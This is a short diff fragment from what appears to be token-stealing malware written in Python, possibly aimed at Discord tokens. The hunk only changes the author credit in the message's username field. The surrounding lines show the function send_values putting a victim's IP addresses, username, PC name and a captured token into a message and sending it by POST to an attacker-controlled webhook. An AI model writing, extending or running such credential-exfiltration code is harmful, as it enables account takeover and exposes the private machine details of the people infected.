@@ -128,7 +128,7 @@ def send_values():
                                         > :desktop: __PC Information__\n\tIP (connection): `{ip}`\n\tIP (machine): `{ip_local}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n
                                         > :smiling_imp: __Token__\n\t`{value}`\n
                                 """
-        payload = json.dumps({'content': embed, 'username': 'Made by m1cr0'})
+        payload = json.dumps({'content': embed, 'username': 'Made by m1cr0-d0t'})
         try:
             req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers2, method='POST')
             try:
